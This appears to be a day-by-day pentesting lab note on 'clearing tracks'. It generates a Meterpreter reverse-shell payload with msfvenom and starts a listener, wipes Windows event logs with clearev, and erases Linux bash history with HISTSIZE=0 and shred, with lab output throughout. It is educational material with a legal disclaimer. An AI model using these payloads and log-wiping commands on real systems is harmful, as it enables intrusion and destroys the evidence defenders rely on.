# Day 23 — Clearing Tracks

## 🎯 Goal
Learn what "clearing tracks" means in the attack lifecycle and practice removing evidence of activity from a compromised **Windows** (via Meterpreter) and **Linux** system.

---

## 📖 Concept
Clearing tracks is the final phase of an attack where the attacker attempts to **erase evidence** of the intrusion — event logs, command history, uploaded tools — to avoid detection and maintain long-term stealth.

---

## 🛠️ Windows — Meterpreter Session

### Step 1: Generate payload
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.29.160 LPORT=443 -f exe -o secret.exe
```
Output: `Payload size: 743 bytes`, `Final size of exe file: 73802 bytes`, `Saved as: secret.exe`

### Step 2: Start listener
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.29.160
set LPORT 443
exploit
```
Result: `Meterpreter session 1 opened (192.168.29.160:443 → 192.168.29.29:50233)`

### Step 3: Confirm target
```
meterpreter > sysinfo
Computer        : DESKTOP-5RFFFDT
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
Meterpreter     : x86/windows
```

### Step 4: Enumerate & clear event logs
```
meterpreter > run event_manager -i
```
Shows all Windows Event Logs with their record counts:

| Log Name | Retention | Max Size | Records |
|---|---|---|---|
| Application | Disabled | 20971520K | 2718 |
| Security | Disabled | 20971520K | 12014 |
| System | Disabled | 20971520K | 2265 |
| Windows PowerShell | Disabled | 15728640K | 996 |

Clear all logs:
```
meterpreter > clearev
[*] Wiping 2718 records from Application...
[*] Wiping 2266 records from System...
[*] Wiping 12014 records from Security...
```
> `clearev` is the built-in Metasploit Meterpreter command that wipes Application, System, and Security event logs in one shot.

---

## 🛠️ Linux — Clearing Bash History

### Common log locations
```bash
cd /var/log
ls
# apache2, auth.log, syslog, messages, wtmp, btmp, kern.log, samba, mysql, etc.
head messages
```

### Clearing shell history
```bash
echo $HISTSIZE        # shows current value, e.g. 500
export HISTSIZE=0     # stops bash from recording new history for this session
history               # confirm commands still logged (session-based)
cat ~/.bash_history    # view existing saved history
```

### Securely deleting history file
```bash
shred -zu /root/.bash_history
```
- `-z` → overwrite with zeros as final pass (hides shredding)
- `-u` → delete (unlink) the file after shredding

### Real-world example (Metasploitable 2)
Exploited via `unix/ftp/vsftpd_234_backdoor`:
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.29.150 - Command shell session 1 closed. Reason: User exit
```
After gaining shell → navigated to `/root`, ran `shred -zu /root/.bash_history` to erase command history before exiting.

---

## ✅ Key Takeaways
- On **Windows**, `clearev` in Meterpreter is the quickest way to clear Application/System/Security logs.
- On **Linux**, simply deleting `.bash_history` isn't enough — set `HISTSIZE=0` to stop new logging, and use `shred` to securely erase the file (regular `rm` leaves recoverable disk remnants).
- This is for **educational/legal pentesting only** — clearing tracks on systems you don't own/have authorization for is illegal.
  
